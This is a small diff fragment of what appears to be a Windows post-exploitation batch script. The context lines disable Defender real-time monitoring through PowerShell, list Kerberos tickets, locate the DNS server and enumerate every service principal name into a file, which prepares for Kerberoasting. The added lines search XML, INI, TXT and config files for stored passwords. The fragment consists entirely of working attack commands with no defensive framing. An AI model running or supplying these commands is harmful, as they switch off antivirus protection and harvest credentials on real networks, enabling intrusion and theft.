@@ -537,6 +537,8 @@ klist
 ECHO ============================
 cmd.exe powershell Set-MpPreference -DisableRealtimeMonitoring $true
 ECHO ============================
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+ECHO ============================
 ECHO | nslookup | findstr "Default\ Server"
 ECHO ============================
 setspn -T * -Q */* > Spnlist.txt
